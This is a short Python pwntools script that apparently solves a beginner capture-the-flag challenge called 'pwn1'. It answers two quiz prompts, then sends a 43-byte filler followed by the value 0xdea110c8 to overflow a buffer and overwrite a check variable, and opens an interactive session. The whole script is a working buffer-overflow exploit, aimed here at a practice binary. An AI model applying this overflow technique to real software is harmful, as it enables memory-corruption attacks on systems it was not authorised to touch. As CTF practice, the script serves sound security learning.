from pwn import *

p = process('./pwn1')

p.sendline("Sir Lancelot of Camelot")
p.sendline("To seek the Holy Grail.")

goal = 0xdea110c8

payload = b"A"*43
payload += p64(goal)

p.sendline(payload)

p.interactive()
